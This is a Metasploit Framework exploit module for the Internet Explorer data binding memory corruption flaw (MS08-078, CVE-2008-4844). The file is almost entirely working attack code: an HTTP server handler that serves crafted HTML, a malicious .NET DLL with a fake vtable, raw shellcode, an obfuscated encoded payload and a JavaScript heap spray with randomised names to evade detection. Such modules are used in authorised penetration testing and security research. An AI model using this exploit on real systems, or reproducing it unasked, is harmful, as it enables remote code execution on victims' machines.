##
# $Id: ms08_078_xml_corruption.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	#
	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "7.0",
	#	:ua_maxver  => "7.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => nil, # no way to test without just trying it
	#})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Data Binding Memory Corruption',
			'Description'    => %q{
				This module exploits a vulnerability in the data binding feature of Internet
			Explorer. In order to execute code reliably, this module uses the .NET DLL
			memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is
			used to create a fake vtable at a known location with all methods pointing
			to our payload. Since the .text segment of the .NET DLL is non-writable, a
			prefixed code stub is used to copy the payload into a new memory segment and
			continue execution from there.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'hdm'
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2008-4844'],
					['OSVDB', '50622'],
					['BID', '32721'],
					['MSB', 'MS08-078'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/961051.mspx'],
					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,

					# Temporary stub virtualalloc() + memcpy() payload to RWX page
					'PrependEncoder' =>
						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"+
						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"+
						"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"+
						"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"+
						"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"+
						"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"+
						"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x54"+
						"\xca\xaf\x91\xff\xd6\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08"+
						"\x56\x6a\x00\xff\xd0\x89\xc3\xeb\x0d\x5e\x89\xdf\xb9\xe8\x03\x00"+
						"\x00\xfc\xf3\xa4\xff\xe3\xe8\xee\xff\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Dec 07 2008',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		@state ||= {}

		ibase = 0x13370000
		vaddr = ibase + 0x2065

		uri,token = request.uri.split('?', 2)


		if(token)
			token,trash = token.split('=')
		end

		if !(token and @state[token])

			print_status("Sending #{self.name} init HTML to #{cli.peerhost}:#{cli.peerport}...")
			token = rand_text_numeric(32)
			if ("/" == get_resource[-1,1])
				dll_uri = get_resource[0, get_resource.length - 1]
			else
				dll_uri = get_resource
			end
			dll_uri << "/generic-" + Time.now.to_i.to_s + ".dll"

			html  = %Q|<html>
<head>
<script language="javascript">
	function forward() {
		window.location = window.location + '?#{token}';
	}

	function start() {
		setTimeout("forward()", 2000);
	}
</script>
</head>
<body onload="start()">
	<object classid="#{dll_uri}?#{token}#GenericControl">
	<object>
</body>
</html>
		|
			@state[token] = :start
			# Transmit the compressed response to the client
			send_response(cli, html, { 'Content-Type' => 'text/html' })
			return
		end

		if (uri.match(/\.dll/i))

			print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")

			return if ((p = regenerate_payload(cli)) == nil)

			# First entry points to the table of pointers
			vtable  = [ vaddr + 4 ].pack("V")
			cbase   = ibase + 0x2065 + (256 * 4)

			# Build a function table
			255.times { vtable << [cbase].pack("V") }

			# Append the shellcode
			vtable << p.encoded
			send_response(
				cli,
				Msf::Util::EXE.to_dotnetmem(ibase, vtable),
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close',
					'Pragma'       => 'no-cache'
				}
			)
			@state[token] = :dll
			return
		end



		print_status("Sending exploit HTML to #{cli.peerhost}:#{cli.peerport} token=#{@state[token]}...")

		html = ""


		#
		# .NET DLL MODE
		#
		if(@state[token] == :dll)

			addr_a,addr_b = [vaddr].pack("V").unpack("v*").map{|v| "&##{v};" }
			data = "==gPOFEUT9CPK4DVYVEV9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiTBB1U8ogPM1EVI1zUBRVQNJ1TGFEVBREID1DRMZUQUFERgk0I9MkUTFEVBREIOFEUTxjC+QFWFRVPTFEVB1kUPZUQUFERgMUPExkRBRVQEBSSj0zQSNVQUFERg4UQQNFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiTBB1U8ogPM1EWvwjPJ1DRJBCTNhFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiVJREP".reverse.unpack("m*")[0]
			bxml = Rex::Text.to_hex(%Q|
<XML ID=I>
	<X>
		<C>
			<![CDATA[
				<image
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
				>
			]]>
		</C>
	</X>
</XML>

#{data}

<script>
	setTimeout('window.location.reload(true);', 250);
</script>
		|, '%')

		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_start     = rand_text_alpha(rand(100) + 1)

		html = %Q|<html>
<head>
<script>
	function #{var_start}() {
		var #{var_unescape} = unescape;
		document.write(#{var_unescape}('#{bxml}'));
	}
</script>
</head>
<body onload="#{var_start}()">
</body>
</html>
		|

		#
		# HEAP SPRAY MODE
		#
		else
			print_status("Heap spray mode")

			addr_a,addr_b = [0x0c0c0c0c].pack("V").unpack("v*").map{|v| "&##{v};" }
			data = "==gPOFEUT9CPK4DVYVEV9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiTBB1U8ogPM1EVI1zUBRVQNJ1TGFEVBREID1DRMZUQUFERgk0I9MkUTFEVBREIOFEUTxjC+QFWFRVPTFEVB1kUPZUQUFERgMUPExkRBRVQEBSSj0zQSNVQUFERg4UQQNFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiTBB1U8ogPM1EWvwjPJ1DRJBCTNhFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiVJREP".reverse.unpack("m*")[0]
			bxml = Rex::Text.to_hex(%Q|
<XML ID=I>
	<X>
		<C>
			<![CDATA[
				<image
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
					SRC=\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X
				>
			]]>
		</C>
	</X>
</XML>

#{data}

<script>
	setTimeout('window.location.reload(true);', 1000);
</script>
		|, '%')

		var_memory    = rand_text_alpha(rand(100) + 1)
		var_boom      = rand_text_alpha(rand(100) + 1)
		var_body      = rand_text_alpha(rand(100) + 1)
		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)
		var_spray     = rand_text_alpha(rand(100) + 1)
		var_start     = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)

		rand_html     = rand_text_english(rand(400) + 500)

		html = %Q|<html>
<head>
<script>
	var #{var_memory} = new Array();
	var #{var_unescape} = unescape;


	function #{var_boom}() {
		document.getElementById('#{var_body}').innerHTML = #{var_unescape}('#{bxml}');
	}

	function #{var_start}() {

		var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');

		var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );

		do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );

		for(#{var_i} = 0; #{var_i} < 100; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};

		setTimeout('#{var_boom}()', 1000);
	}
</script>
</head>
<body onload="#{var_start}()" id="#{var_body}">
#{rand_html}
</body>
</html>
		|
		end

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end

